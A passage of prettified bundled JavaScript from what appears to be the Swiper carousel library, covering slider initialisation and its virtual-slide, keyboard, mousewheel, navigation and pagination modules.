              (i.originalParams = h.extend({}, i.params)),
              (i.passedParams = h.extend({}, s)),
              (i.$ = d);
            const n = d(i.params.el);
            if (((t = n[0]), !t)) return;
            if (n.length > 1) {
              const e = [];
              return (
                n.each((t, i) => {
                  const a = h.extend({}, s, { el: i });
                  e.push(new O(a));
                }),
                e
              );
            }
            let r;
            return (
              (t.swiper = i),
              n.data("swiper", i),
              t && t.shadowRoot && t.shadowRoot.querySelector
                ? ((r = d(
                    t.shadowRoot.querySelector(`.${i.params.wrapperClass}`)
                  )),
                  (r.children = (e) => n.children(e)))
                : (r = n.children(`.${i.params.wrapperClass}`)),
              h.extend(i, {
                $el: n,
                el: t,
                $wrapperEl: r,
                wrapperEl: r[0],
                classNames: [],
                slides: d(),
                slidesGrid: [],
                snapGrid: [],
                slidesSizesGrid: [],
                isHorizontal: () => "horizontal" === i.params.direction,
                isVertical: () => "vertical" === i.params.direction,
                rtl:
                  "rtl" === t.dir.toLowerCase() || "rtl" === n.css("direction"),
                rtlTranslate:
                  "horizontal" === i.params.direction &&
                  ("rtl" === t.dir.toLowerCase() ||
                    "rtl" === n.css("direction")),
                wrongRTL: "-webkit-box" === r.css("display"),
                activeIndex: 0,
                realIndex: 0,
                isBeginning: !0,
                isEnd: !1,
                translate: 0,
                previousTranslate: 0,
                progress: 0,
                velocity: 0,
                animating: !1,
                allowSlideNext: i.params.allowSlideNext,
                allowSlidePrev: i.params.allowSlidePrev,
                touchEvents: (function () {
                  const e = [
                    "touchstart",
                    "touchmove",
                    "touchend",
                    "touchcancel",
                  ];
                  let t = ["mousedown", "mousemove", "mouseup"];
                  return (
                    u.pointerEvents &&
                      (t = ["pointerdown", "pointermove", "pointerup"]),
                    (i.touchEventsTouch = {
                      start: e[0],
                      move: e[1],
                      end: e[2],
                      cancel: e[3],
                    }),
                    (i.touchEventsDesktop = {
                      start: t[0],
                      move: t[1],
                      end: t[2],
                    }),
                    u.touch || !i.params.simulateTouch
                      ? i.touchEventsTouch
                      : i.touchEventsDesktop
                  );
                })(),
                touchEventsData: {
                  isTouched: void 0,
                  isMoved: void 0,
                  allowTouchCallbacks: void 0,
                  touchStartTime: void 0,
                  isScrolling: void 0,
                  currentTranslate: void 0,
                  startTranslate: void 0,
                  allowThresholdMove: void 0,
                  formElements:
                    "input, select, option, textarea, button, video, label",
                  lastClickTime: h.now(),
                  clickTimeout: void 0,
                  velocities: [],
                  allowMomentumBounce: void 0,
                  isTouchEvent: void 0,
                  startMoving: void 0,
                },
                allowClick: !0,
                allowTouchMove: i.params.allowTouchMove,
                touches: {
                  startX: 0,
                  startY: 0,
                  currentX: 0,
                  currentY: 0,
                  diff: 0,
                },
                imagesToLoad: [],
                imagesLoaded: 0,
              }),
              i.useModules(),
              i.params.init && i.init(),
              i
            );
          }
          slidesPerViewDynamic() {
            const {
              params: e,
              slides: t,
              slidesGrid: s,
              size: i,
              activeIndex: a,
            } = this;
            let n = 1;
            if (e.centeredSlides) {
              let e,
                s = t[a].swiperSlideSize;
              for (let r = a + 1; r < t.length; r += 1)
                t[r] &&
                  !e &&
                  ((s += t[r].swiperSlideSize), (n += 1), s > i && (e = !0));
              for (let r = a - 1; r >= 0; r -= 1)
                t[r] &&
                  !e &&
                  ((s += t[r].swiperSlideSize), (n += 1), s > i && (e = !0));
            } else
              for (let e = a + 1; e < t.length; e += 1)
                s[e] - s[a] < i && (n += 1);
            return n;
          }
          update() {
            const e = this;
            if (!e || e.destroyed) return;
            const { snapGrid: t, params: s } = e;
            function i() {
              const t = e.rtlTranslate ? -1 * e.translate : e.translate,
                s = Math.min(Math.max(t, e.maxTranslate()), e.minTranslate());
              e.setTranslate(s), e.updateActiveIndex(), e.updateSlidesClasses();
            }
            let a;
            s.breakpoints && e.setBreakpoint(),
              e.updateSize(),
              e.updateSlides(),
              e.updateProgress(),
              e.updateSlidesClasses(),
              e.params.freeMode
                ? (i(), e.params.autoHeight && e.updateAutoHeight())
                : ((a =
                    ("auto" === e.params.slidesPerView ||
                      e.params.slidesPerView > 1) &&
                    e.isEnd &&
                    !e.params.centeredSlides
                      ? e.slideTo(e.slides.length - 1, 0, !1, !0)
                      : e.slideTo(e.activeIndex, 0, !1, !0)),
                  a || i()),
              s.watchOverflow && t !== e.snapGrid && e.checkOverflow(),
              e.emit("update");
          }
          changeDirection(e, t = !0) {
            const s = this,
              i = s.params.direction;
            return (
              e || (e = "horizontal" === i ? "vertical" : "horizontal"),
              e === i ||
                ("horizontal" !== e && "vertical" !== e) ||
                (s.$el
                  .removeClass(`${s.params.containerModifierClass}${i}`)
                  .addClass(`${s.params.containerModifierClass}${e}`),
                (s.params.direction = e),
                s.slides.each((t, s) => {
                  "vertical" === e
                    ? (s.style.width = "")
                    : (s.style.height = "");
                }),
                s.emit("changeDirection"),
                t && s.update()),
              s
            );
          }
          init() {
            const e = this;
            e.initialized ||
              (e.emit("beforeInit"),
              e.params.breakpoints && e.setBreakpoint(),
              e.addClasses(),
              e.params.loop && e.loopCreate(),
              e.updateSize(),
              e.updateSlides(),
              e.params.watchOverflow && e.checkOverflow(),
              e.params.grabCursor && e.setGrabCursor(),
              e.params.preloadImages && e.preloadImages(),
              e.params.loop
                ? e.slideTo(
                    e.params.initialSlide + e.loopedSlides,
                    0,
                    e.params.runCallbacksOnInit
                  )
                : e.slideTo(
                    e.params.initialSlide,
                    0,
                    e.params.runCallbacksOnInit
                  ),
              e.attachEvents(),
              (e.initialized = !0),
              e.emit("init"));
          }
          destroy(e = !0, t = !0) {
            const s = this,
              { params: i, $el: a, $wrapperEl: n, slides: r } = s;
            return (
              void 0 === s.params ||
                s.destroyed ||
                (s.emit("beforeDestroy"),
                (s.initialized = !1),
                s.detachEvents(),
                i.loop && s.loopDestroy(),
                t &&
                  (s.removeClasses(),
                  a.removeAttr("style"),
                  n.removeAttr("style"),
                  r &&
                    r.length &&
                    r
                      .removeClass(
                        [
                          i.slideVisibleClass,
                          i.slideActiveClass,
                          i.slideNextClass,
                          i.slidePrevClass,
                        ].join(" ")
                      )
                      .removeAttr("style")
                      .removeAttr("data-swiper-slide-index")),
                s.emit("destroy"),
                Object.keys(s.eventsListeners).forEach((e) => {
                  s.off(e);
                }),
                !1 !== e &&
                  ((s.$el[0].swiper = null),
                  s.$el.data("swiper", null),
                  h.deleteProps(s)),
                (s.destroyed = !0)),
              null
            );
          }
          static extendDefaults(e) {
            h.extend(P, e);
          }
          static get extendedDefaults() {
            return P;
          }
          static get defaults() {
            return k;
          }
          static get Class() {
            return m;
          }
          static get $() {
            return d;
          }
        }
        var D = { name: "device", proto: { device: x }, static: { device: x } },
          A = {
            name: "support",
            proto: { support: u },
            static: { support: u },
          };
        const G = {
          isEdge: !!o.navigator.userAgent.match(/Edge/g),
          isSafari: (function () {
            const e = o.navigator.userAgent.toLowerCase();
            return (
              e.indexOf("safari") >= 0 &&
              e.indexOf("chrome") < 0 &&
              e.indexOf("android") < 0
            );
          })(),
          isWebView: /(iPhone|iPod|iPad).*AppleWebKit(?!.*Safari)/i.test(
            o.navigator.userAgent
          ),
        };
        var B = {
            name: "browser",
            proto: { browser: G },
            static: { browser: G },
          },
          H = {
            name: "resize",
            create() {
              const e = this;
              h.extend(e, {
                resize: {
                  resizeHandler() {
                    e &&
                      !e.destroyed &&
                      e.initialized &&
                      (e.emit("beforeResize"), e.emit("resize"));
                  },
                  orientationChangeHandler() {
                    e &&
                      !e.destroyed &&
                      e.initialized &&
                      e.emit("orientationchange");
                  },
                },
              });
            },
            on: {
              init() {
                o.addEventListener("resize", this.resize.resizeHandler),
                  o.addEventListener(
                    "orientationchange",
                    this.resize.orientationChangeHandler
                  );
              },
              destroy() {
                o.removeEventListener("resize", this.resize.resizeHandler),
                  o.removeEventListener(
                    "orientationchange",
                    this.resize.orientationChangeHandler
                  );
              },
            },
          };
        const N = {
          func: o.MutationObserver || o.WebkitMutationObserver,
          attach(e, t = {}) {
            const s = this,
              i = new (0, N.func)((e) => {
                if (1 === e.length) return void s.emit("observerUpdate", e[0]);
                const t = function () {
                  s.emit("observerUpdate", e[0]);
                };
                o.requestAnimationFrame
                  ? o.requestAnimationFrame(t)
                  : o.setTimeout(t, 0);
              });
            i.observe(e, {
              attributes: void 0 === t.attributes || t.attributes,
              childList: void 0 === t.childList || t.childList,
              characterData: void 0 === t.characterData || t.characterData,
            }),
              s.observer.observers.push(i);
          },
          init() {
            const e = this;
            if (u.observer && e.params.observer) {
              if (e.params.observeParents) {
                const t = e.$el.parents();
                for (let s = 0; s < t.length; s += 1) e.observer.attach(t[s]);
              }
              e.observer.attach(e.$el[0], {
                childList: e.params.observeSlideChildren,
              }),
                e.observer.attach(e.$wrapperEl[0], { attributes: !1 });
            }
          },
          destroy() {
            this.observer.observers.forEach((e) => {
              e.disconnect();
            }),
              (this.observer.observers = []);
          },
        };
        var V = {
          name: "observer",
          params: {
            observer: !1,
            observeParents: !1,
            observeSlideChildren: !1,
          },
          create() {
            const e = this;
            h.extend(e, {
              observer: {
                init: N.init.bind(e),
                attach: N.attach.bind(e),
                destroy: N.destroy.bind(e),
                observers: [],
              },
            });
          },
          on: {
            init() {
              this.observer.init();
            },
            destroy() {
              this.observer.destroy();
            },
          },
        };
        const F = {
          update(e) {
            const t = this,
              {
                slidesPerView: s,
                slidesPerGroup: i,
                centeredSlides: a,
              } = t.params,
              { addSlidesBefore: n, addSlidesAfter: r } = t.params.virtual,
              {
                from: o,
                to: l,
                slides: d,
                slidesGrid: c,
                renderSlide: p,
                offset: u,
              } = t.virtual;
            t.updateActiveIndex();
            const m = t.activeIndex || 0;
            let g, f, v;
            (g = t.rtlTranslate ? "right" : t.isHorizontal() ? "left" : "top"),
              a
                ? ((f = Math.floor(s / 2) + i + n),
                  (v = Math.floor(s / 2) + i + r))
                : ((f = s + (i - 1) + n), (v = i + r));
            const y = Math.max((m || 0) - v, 0),
              b = Math.min((m || 0) + f, d.length - 1),
              w = (t.slidesGrid[y] || 0) - (t.slidesGrid[0] || 0);
            function x() {
              t.updateSlides(),
                t.updateProgress(),
                t.updateSlidesClasses(),
                t.lazy && t.params.lazy.enabled && t.lazy.load();
            }
            if (
              (h.extend(t.virtual, {
                from: y,
                to: b,
                offset: w,
                slidesGrid: t.slidesGrid,
              }),
              o === y && l === b && !e)
            )
              return (
                t.slidesGrid !== c && w !== u && t.slides.css(g, `${w}px`),
                void t.updateProgress()
              );
            if (t.params.virtual.renderExternal)
              return (
                t.params.virtual.renderExternal.call(t, {
                  offset: w,
                  from: y,
                  to: b,
                  slides: (function () {
                    const e = [];
                    for (let t = y; t <= b; t += 1) e.push(d[t]);
                    return e;
                  })(),
                }),
                void x()
              );
            const T = [],
              C = [];
            if (e) t.$wrapperEl.find(`.${t.params.slideClass}`).remove();
            else
              for (let e = o; e <= l; e += 1)
                (e < y || e > b) &&
                  t.$wrapperEl
                    .find(
                      `.${t.params.slideClass}[data-swiper-slide-index="${e}"]`
                    )
                    .remove();
            for (let t = 0; t < d.length; t += 1)
              t >= y &&
                t <= b &&
                (void 0 === l || e
                  ? C.push(t)
                  : (t > l && C.push(t), t < o && T.push(t)));
            C.forEach((e) => {
              t.$wrapperEl.append(p(d[e], e));
            }),
              T.sort((e, t) => t - e).forEach((e) => {
                t.$wrapperEl.prepend(p(d[e], e));
              }),
              t.$wrapperEl.children(".swiper-slide").css(g, `${w}px`),
              x();
          },
          renderSlide(e, t) {
            const s = this,
              i = s.params.virtual;
            if (i.cache && s.virtual.cache[t]) return s.virtual.cache[t];
            const a = i.renderSlide
              ? d(i.renderSlide.call(s, e, t))
              : d(
                  `<div class="${s.params.slideClass}" data-swiper-slide-index="${t}">${e}</div>`
                );
            return (
              a.attr("data-swiper-slide-index") ||
                a.attr("data-swiper-slide-index", t),
              i.cache && (s.virtual.cache[t] = a),
              a
            );
          },
          appendSlide(e) {
            const t = this;
            if ("object" == typeof e && "length" in e)
              for (let s = 0; s < e.length; s += 1)
                e[s] && t.virtual.slides.push(e[s]);
            else t.virtual.slides.push(e);
            t.virtual.update(!0);
          },
          prependSlide(e) {
            const t = this,
              s = t.activeIndex;
            let i = s + 1,
              a = 1;
            if (Array.isArray(e)) {
              for (let s = 0; s < e.length; s += 1)
                e[s] && t.virtual.slides.unshift(e[s]);
              (i = s + e.length), (a = e.length);
            } else t.virtual.slides.unshift(e);
            if (t.params.virtual.cache) {
              const e = t.virtual.cache,
                s = {};
              Object.keys(e).forEach((t) => {
                const i = e[t],
                  n = i.attr("data-swiper-slide-index");
                n && i.attr("data-swiper-slide-index", parseInt(n, 10) + 1),
                  (s[parseInt(t, 10) + a] = i);
              }),
                (t.virtual.cache = s);
            }
            t.virtual.update(!0), t.slideTo(i, 0);
          },
          removeSlide(e) {
            const t = this;
            if (null == e) return;
            let s = t.activeIndex;
            if (Array.isArray(e))
              for (let i = e.length - 1; i >= 0; i -= 1)
                t.virtual.slides.splice(e[i], 1),
                  t.params.virtual.cache && delete t.virtual.cache[e[i]],
                  e[i] < s && (s -= 1),
                  (s = Math.max(s, 0));
            else
              t.virtual.slides.splice(e, 1),
                t.params.virtual.cache && delete t.virtual.cache[e],
                e < s && (s -= 1),
                (s = Math.max(s, 0));
            t.virtual.update(!0), t.slideTo(s, 0);
          },
          removeAllSlides() {
            const e = this;
            (e.virtual.slides = []),
              e.params.virtual.cache && (e.virtual.cache = {}),
              e.virtual.update(!0),
              e.slideTo(0, 0);
          },
        };
        var X = {
          name: "virtual",
          params: {
            virtual: {
              enabled: !1,
              slides: [],
              cache: !0,
              renderSlide: null,
              renderExternal: null,
              addSlidesBefore: 0,
              addSlidesAfter: 0,
            },
          },
          create() {
            const e = this;
            h.extend(e, {
              virtual: {
                update: F.update.bind(e),
                appendSlide: F.appendSlide.bind(e),
                prependSlide: F.prependSlide.bind(e),
                removeSlide: F.removeSlide.bind(e),
                removeAllSlides: F.removeAllSlides.bind(e),
                renderSlide: F.renderSlide.bind(e),
                slides: e.params.virtual.slides,
                cache: {},
              },
            });
          },
          on: {
            beforeInit() {
              const e = this;
              if (!e.params.virtual.enabled) return;
              e.classNames.push(`${e.params.containerModifierClass}virtual`);
              const t = { watchSlidesProgress: !0 };
              h.extend(e.params, t),
                h.extend(e.originalParams, t),
                e.params.initialSlide || e.virtual.update();
            },
            setTranslate() {
              this.params.virtual.enabled && this.virtual.update();
            },
          },
        };
        const Y = {
          handle(e) {
            const t = this,
              { rtlTranslate: s } = t;
            let i = e;
            i.originalEvent && (i = i.originalEvent);
            const a = i.keyCode || i.charCode,
              r = t.params.keyboard.pageUpDown,
              l = r && 33 === a,
              d = r && 34 === a,
              c = 37 === a,
              p = 39 === a,
              h = 38 === a,
              u = 40 === a;
            if (
              !t.allowSlideNext &&
              ((t.isHorizontal() && p) || (t.isVertical() && u) || d)
            )
              return !1;
            if (
              !t.allowSlidePrev &&
              ((t.isHorizontal() && c) || (t.isVertical() && h) || l)
            )
              return !1;
            if (
              !(
                i.shiftKey ||
                i.altKey ||
                i.ctrlKey ||
                i.metaKey ||
                (n.activeElement &&
                  n.activeElement.nodeName &&
                  ("input" === n.activeElement.nodeName.toLowerCase() ||
                    "textarea" === n.activeElement.nodeName.toLowerCase()))
              )
            ) {
              if (
                t.params.keyboard.onlyInViewport &&
                (l || d || c || p || h || u)
              ) {
                let e = !1;
                if (
                  t.$el.parents(`.${t.params.slideClass}`).length > 0 &&
                  0 === t.$el.parents(`.${t.params.slideActiveClass}`).length
                )
                  return;
                const i = o.innerWidth,
                  a = o.innerHeight,
                  n = t.$el.offset();
                s && (n.left -= t.$el[0].scrollLeft);
                const r = [
                  [n.left, n.top],
                  [n.left + t.width, n.top],
                  [n.left, n.top + t.height],
                  [n.left + t.width, n.top + t.height],
                ];
                for (let t = 0; t < r.length; t += 1) {
                  const s = r[t];
                  s[0] >= 0 && s[0] <= i && s[1] >= 0 && s[1] <= a && (e = !0);
                }
                if (!e) return;
              }
              t.isHorizontal()
                ? ((l || d || c || p) &&
                    (i.preventDefault
                      ? i.preventDefault()
                      : (i.returnValue = !1)),
                  (((d || p) && !s) || ((l || c) && s)) && t.slideNext(),
                  (((l || c) && !s) || ((d || p) && s)) && t.slidePrev())
                : ((l || d || h || u) &&
                    (i.preventDefault
                      ? i.preventDefault()
                      : (i.returnValue = !1)),
                  (d || u) && t.slideNext(),
                  (l || h) && t.slidePrev()),
                t.emit("keyPress", a);
            }
          },
          enable() {
            const e = this;
            e.keyboard.enabled ||
              (d(n).on("keydown", e.keyboard.handle),
              (e.keyboard.enabled = !0));
          },
          disable() {
            const e = this;
            e.keyboard.enabled &&
              (d(n).off("keydown", e.keyboard.handle),
              (e.keyboard.enabled = !1));
          },
        };
        var q = {
          name: "keyboard",
          params: {
            keyboard: { enabled: !1, onlyInViewport: !0, pageUpDown: !0 },
          },
          create() {
            const e = this;
            h.extend(e, {
              keyboard: {
                enabled: !1,
                enable: Y.enable.bind(e),
                disable: Y.disable.bind(e),
                handle: Y.handle.bind(e),
              },
            });
          },
          on: {
            init() {
              this.params.keyboard.enabled && this.keyboard.enable();
            },
            destroy() {
              this.keyboard.enabled && this.keyboard.disable();
            },
          },
        };
        const _ = {
            lastScrollTime: h.now(),
            lastEventBeforeSnap: void 0,
            recentWheelEvents: [],
            event: () =>
              o.navigator.userAgent.indexOf("firefox") > -1
                ? "DOMMouseScroll"
                : (function () {
                    const e = "onwheel";
                    let t = e in n;
                    if (!t) {
                      const s = n.createElement("div");
                      s.setAttribute(e, "return;"),
                        (t = "function" == typeof s.onwheel);
                    }
                    return (
                      !t &&
                        n.implementation &&
                        n.implementation.hasFeature &&
                        !0 !== n.implementation.hasFeature("", "") &&
                        (t = n.implementation.hasFeature(
                          "Events.wheel",
                          "3.0"
                        )),
                      t
                    );
                  })()
                ? "wheel"
                : "mousewheel",
            normalize(e) {
              let t = 0,
                s = 0,
                i = 0,
                a = 0;
              return (
                "detail" in e && (s = e.detail),
                "wheelDelta" in e && (s = -e.wheelDelta / 120),
                "wheelDeltaY" in e && (s = -e.wheelDeltaY / 120),
                "wheelDeltaX" in e && (t = -e.wheelDeltaX / 120),
                "axis" in e &&
                  e.axis === e.HORIZONTAL_AXIS &&
                  ((t = s), (s = 0)),
                (i = 10 * t),
                (a = 10 * s),
                "deltaY" in e && (a = e.deltaY),
                "deltaX" in e && (i = e.deltaX),
                e.shiftKey && !i && ((i = a), (a = 0)),
                (i || a) &&
                  e.deltaMode &&
                  (1 === e.deltaMode
                    ? ((i *= 40), (a *= 40))
                    : ((i *= 800), (a *= 800))),
                i && !t && (t = i < 1 ? -1 : 1),
                a && !s && (s = a < 1 ? -1 : 1),
                { spinX: t, spinY: s, pixelX: i, pixelY: a }
              );
            },
            handleMouseEnter() {
              this.mouseEntered = !0;
            },
            handleMouseLeave() {
              this.mouseEntered = !1;
            },
            handle(e) {
              let t = e;
              const s = this,
                i = s.params.mousewheel;
              s.params.cssMode && t.preventDefault();
              let a = s.$el;
              if (
                ("container" !== s.params.mousewheel.eventsTarged &&
                  (a = d(s.params.mousewheel.eventsTarged)),
                !s.mouseEntered &&
                  !a[0].contains(t.target) &&
                  !i.releaseOnEdges)
              )
                return !0;
              t.originalEvent && (t = t.originalEvent);
              let n = 0;
              const r = s.rtlTranslate ? -1 : 1,
                o = _.normalize(t);
              if (i.forceToAxis)
                if (s.isHorizontal()) {
                  if (!(Math.abs(o.pixelX) > Math.abs(o.pixelY))) return !0;
                  n = -o.pixelX * r;
                } else {
                  if (!(Math.abs(o.pixelY) > Math.abs(o.pixelX))) return !0;
                  n = -o.pixelY;
                }
              else
                n =
                  Math.abs(o.pixelX) > Math.abs(o.pixelY)
                    ? -o.pixelX * r
                    : -o.pixelY;
              if (0 === n) return !0;
              if ((i.invert && (n = -n), s.params.freeMode)) {
                const e = {
                    time: h.now(),
                    delta: Math.abs(n),
                    direction: Math.sign(n),
                  },
                  { lastEventBeforeSnap: a } = s.mousewheel,
                  r =
                    a &&
                    e.time < a.time + 500 &&
                    e.delta <= a.delta &&
                    e.direction === a.direction;
                if (!r) {
                  (s.mousewheel.lastEventBeforeSnap = void 0),
                    s.params.loop && s.loopFix();
                  let a = s.getTranslate() + n * i.sensitivity;
                  const o = s.isBeginning,
                    l = s.isEnd;
                  if (
                    (a >= s.minTranslate() && (a = s.minTranslate()),
                    a <= s.maxTranslate() && (a = s.maxTranslate()),
                    s.setTransition(0),
                    s.setTranslate(a),
                    s.updateProgress(),
                    s.updateActiveIndex(),
                    s.updateSlidesClasses(),
                    ((!o && s.isBeginning) || (!l && s.isEnd)) &&
                      s.updateSlidesClasses(),
                    s.params.freeModeSticky)
                  ) {
                    clearTimeout(s.mousewheel.timeout),
                      (s.mousewheel.timeout = void 0);
                    const t = s.mousewheel.recentWheelEvents;
                    t.length >= 15 && t.shift();
                    const i = t.length ? t[t.length - 1] : void 0,
                      a = t[0];
                    if (
                      (t.push(e),
                      i && (e.delta > i.delta || e.direction !== i.direction))
                    )
                      t.splice(0);
                    else if (
                      t.length >= 15 &&
                      e.time - a.time < 500 &&
                      a.delta - e.delta >= 1 &&
                      e.delta <= 6
                    ) {
                      const i = n > 0 ? 0.8 : 0.2;
                      (s.mousewheel.lastEventBeforeSnap = e),
                        t.splice(0),
                        (s.mousewheel.timeout = h.nextTick(() => {
                          s.slideToClosest(s.params.speed, !0, void 0, i);
                        }, 0));
                    }
                    s.mousewheel.timeout ||
                      (s.mousewheel.timeout = h.nextTick(() => {
                        (s.mousewheel.lastEventBeforeSnap = e),
                          t.splice(0),
                          s.slideToClosest(s.params.speed, !0, void 0, 0.5);
                      }, 500));
                  }
                  if (
                    (r || s.emit("scroll", t),
                    s.params.autoplay &&
                      s.params.autoplayDisableOnInteraction &&
                      s.autoplay.stop(),
                    a === s.minTranslate() || a === s.maxTranslate())
                  )
                    return !0;
                }
              } else {
                const t = {
                    time: h.now(),
                    delta: Math.abs(n),
                    direction: Math.sign(n),
                    raw: e,
                  },
                  i = s.mousewheel.recentWheelEvents;
                i.length >= 2 && i.shift();
                const a = i.length ? i[i.length - 1] : void 0;
                if (
                  (i.push(t),
                  a
                    ? (t.direction !== a.direction ||
                        t.delta > a.delta ||
                        t.time > a.time + 150) &&
                      s.mousewheel.animateSlider(t)
                    : s.mousewheel.animateSlider(t),
                  s.mousewheel.releaseScroll(t))
                )
                  return !0;
              }
              return (
                t.preventDefault ? t.preventDefault() : (t.returnValue = !1), !1
              );
            },
            animateSlider(e) {
              const t = this;
              return (
                (e.delta >= 6 && h.now() - t.mousewheel.lastScrollTime < 60) ||
                (e.direction < 0
                  ? (t.isEnd && !t.params.loop) ||
                    t.animating ||
                    (t.slideNext(), t.emit("scroll", e.raw))
                  : (t.isBeginning && !t.params.loop) ||
                    t.animating ||
                    (t.slidePrev(), t.emit("scroll", e.raw)),
                (t.mousewheel.lastScrollTime = new o.Date().getTime()),
                !1)
              );
            },
            releaseScroll(e) {
              const t = this,
                s = t.params.mousewheel;
              if (e.direction < 0) {
                if (t.isEnd && !t.params.loop && s.releaseOnEdges) return !0;
              } else if (t.isBeginning && !t.params.loop && s.releaseOnEdges)
                return !0;
              return !1;
            },
            enable() {
              const e = this,
                t = _.event();
              if (e.params.cssMode)
                return (
                  e.wrapperEl.removeEventListener(t, e.mousewheel.handle), !0
                );
              if (!t) return !1;
              if (e.mousewheel.enabled) return !1;
              let s = e.$el;
              return (
                "container" !== e.params.mousewheel.eventsTarged &&
                  (s = d(e.params.mousewheel.eventsTarged)),
                s.on("mouseenter", e.mousewheel.handleMouseEnter),
                s.on("mouseleave", e.mousewheel.handleMouseLeave),
                s.on(t, e.mousewheel.handle),
                (e.mousewheel.enabled = !0),
                !0
              );
            },
            disable() {
              const e = this,
                t = _.event();
              if (e.params.cssMode)
                return e.wrapperEl.addEventListener(t, e.mousewheel.handle), !0;
              if (!t) return !1;
              if (!e.mousewheel.enabled) return !1;
              let s = e.$el;
              return (
                "container" !== e.params.mousewheel.eventsTarged &&
                  (s = d(e.params.mousewheel.eventsTarged)),
                s.off(t, e.mousewheel.handle),
                (e.mousewheel.enabled = !1),
                !0
              );
            },
          },
          W = {
            update() {
              const e = this,
                t = e.params.navigation;
              if (e.params.loop) return;
              const { $nextEl: s, $prevEl: i } = e.navigation;
              i &&
                i.length > 0 &&
                (e.isBeginning
                  ? i.addClass(t.disabledClass)
                  : i.removeClass(t.disabledClass),
                i[
                  e.params.watchOverflow && e.isLocked
                    ? "addClass"
                    : "removeClass"
                ](t.lockClass)),
                s &&
                  s.length > 0 &&
                  (e.isEnd
                    ? s.addClass(t.disabledClass)
                    : s.removeClass(t.disabledClass),
                  s[
                    e.params.watchOverflow && e.isLocked
                      ? "addClass"
                      : "removeClass"
                  ](t.lockClass));
            },
            onPrevClick(e) {
              const t = this;
              e.preventDefault(),
                (t.isBeginning && !t.params.loop) || t.slidePrev();
            },
            onNextClick(e) {
              const t = this;
              e.preventDefault(), (t.isEnd && !t.params.loop) || t.slideNext();
            },
            init() {
              const e = this,
                t = e.params.navigation;
              if (!t.nextEl && !t.prevEl) return;
              let s, i;
              t.nextEl &&
                ((s = d(t.nextEl)),
                e.params.uniqueNavElements &&
                  "string" == typeof t.nextEl &&
                  s.length > 1 &&
                  1 === e.$el.find(t.nextEl).length &&
                  (s = e.$el.find(t.nextEl))),
                t.prevEl &&
                  ((i = d(t.prevEl)),
                  e.params.uniqueNavElements &&
                    "string" == typeof t.prevEl &&
                    i.length > 1 &&
                    1 === e.$el.find(t.prevEl).length &&
                    (i = e.$el.find(t.prevEl))),
                s && s.length > 0 && s.on("click", e.navigation.onNextClick),
                i && i.length > 0 && i.on("click", e.navigation.onPrevClick),
                h.extend(e.navigation, {
                  $nextEl: s,
                  nextEl: s && s[0],
                  $prevEl: i,
                  prevEl: i && i[0],
                });
            },
            destroy() {
              const e = this,
                { $nextEl: t, $prevEl: s } = e.navigation;
              t &&
                t.length &&
                (t.off("click", e.navigation.onNextClick),
                t.removeClass(e.params.navigation.disabledClass)),
                s &&
                  s.length &&
                  (s.off("click", e.navigation.onPrevClick),
                  s.removeClass(e.params.navigation.disabledClass));
            },
          },
          j = {
            update() {
              const e = this,
                t = e.rtl,
                s = e.params.pagination;
              if (
                !s.el ||
                !e.pagination.el ||
                !e.pagination.$el ||
                0 === e.pagination.$el.length
              )
                return;
              const i =
                  e.virtual && e.params.virtual.enabled
                    ? e.virtual.slides.length
                    : e.slides.length,
                a = e.pagination.$el;
              let n;
              const r = e.params.loop
                ? Math.ceil((i - 2 * e.loopedSlides) / e.params.slidesPerGroup)
                : e.snapGrid.length;
              if (
                (e.params.loop
                  ? ((n = Math.ceil(
                      (e.activeIndex - e.loopedSlides) / e.params.slidesPerGroup
                    )),
                    n > i - 1 - 2 * e.loopedSlides &&
                      (n -= i - 2 * e.loopedSlides),
                    n > r - 1 && (n -= r),
                    n < 0 &&
                      "bullets" !== e.params.paginationType &&
                      (n = r + n))
                  : (n =
                      void 0 !== e.snapIndex
                        ? e.snapIndex
                        : e.activeIndex || 0),
                "bullets" === s.type &&
                  e.pagination.bullets &&
                  e.pagination.bullets.length > 0)
              ) {
                const i = e.pagination.bullets;
                let r, o, l;
                if (
                  (s.dynamicBullets &&
                    ((e.pagination.bulletSize = i
                      .eq(0)
                      [e.isHorizontal() ? "outerWidth" : "outerHeight"](!0)),
                    a.css(
                      e.isHorizontal() ? "width" : "height",
                      e.pagination.bulletSize * (s.dynamicMainBullets + 4) +
                        "px"
                    ),
                    s.dynamicMainBullets > 1 &&
                      void 0 !== e.previousIndex &&
                      ((e.pagination.dynamicBulletIndex += n - e.previousIndex),
                      e.pagination.dynamicBulletIndex > s.dynamicMainBullets - 1
                        ? (e.pagination.dynamicBulletIndex =
                            s.dynamicMainBullets - 1)
                        : e.pagination.dynamicBulletIndex < 0 &&
                          (e.pagination.dynamicBulletIndex = 0)),
                    (r = n - e.pagination.dynamicBulletIndex),
                    (o = r + (Math.min(i.length, s.dynamicMainBullets) - 1)),
                    (l = (o + r) / 2)),
                  i.removeClass(
                    `${s.bulletActiveClass} ${s.bulletActiveClass}-next ${s.bulletActiveClass}-next-next ${s.bulletActiveClass}-prev ${s.bulletActiveClass}-prev-prev ${s.bulletActiveClass}-main`
                  ),
                  a.length > 1)
                )
                  i.each((e, t) => {
                    const i = d(t),
                      a = i.index();
                    a === n && i.addClass(s.bulletActiveClass),
                      s.dynamicBullets &&
                        (a >= r &&
                          a <= o &&
                          i.addClass(`${s.bulletActiveClass}-main`),
                        a === r &&
                          i
                            .prev()
                            .addClass(`${s.bulletActiveClass}-prev`)
                            .prev()
                            .addClass(`${s.bulletActiveClass}-prev-prev`),
                        a === o &&
                          i
                            .next()
                            .addClass(`${s.bulletActiveClass}-next`)
                            .next()
                            .addClass(`${s.bulletActiveClass}-next-next`));
                  });
                else {
                  const t = i.eq(n),
                    a = t.index();
                  if ((t.addClass(s.bulletActiveClass), s.dynamicBullets)) {
                    const t = i.eq(r),
                      n = i.eq(o);
                    for (let e = r; e <= o; e += 1)
                      i.eq(e).addClass(`${s.bulletActiveClass}-main`);
                    if (e.params.loop)
                      if (a >= i.length - s.dynamicMainBullets) {
                        for (let e = s.dynamicMainBullets; e >= 0; e -= 1)
                          i.eq(i.length - e).addClass(
                            `${s.bulletActiveClass}-main`
                          );
                        i.eq(i.length - s.dynamicMainBullets - 1).addClass(
                          `${s.bulletActiveClass}-prev`
                        );
                      } else
                        t
                          .prev()
                          .addClass(`${s.bulletActiveClass}-prev`)
                          .prev()
                          .addClass(`${s.bulletActiveClass}-prev-prev`),
                          n
                            .next()
                            .addClass(`${s.bulletActiveClass}-next`)
                            .next()
                            .addClass(`${s.bulletActiveClass}-next-next`);
                    else
                      t
                        .prev()
